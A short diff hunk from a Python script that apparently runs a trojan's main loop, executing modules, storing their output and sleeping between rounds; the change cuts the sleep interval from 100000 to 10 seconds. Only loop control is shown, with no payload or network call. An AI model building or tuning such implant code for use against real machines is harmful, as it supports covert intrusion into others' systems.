@@ -148,7 +148,7 @@ while True:
             trojan_output_file_contents += "[*] Finished Executing Modules\n"
             store_output()
     #sleep_time = random.randint(60,120)
-    sleep_time = 100000
+    sleep_time = 10
     trojan_output_file_contents += f"[*] Sleeping For {sleep_time} Seconds\n"
     #print(trojan_output_file_contents)
     time.sleep(sleep_time)
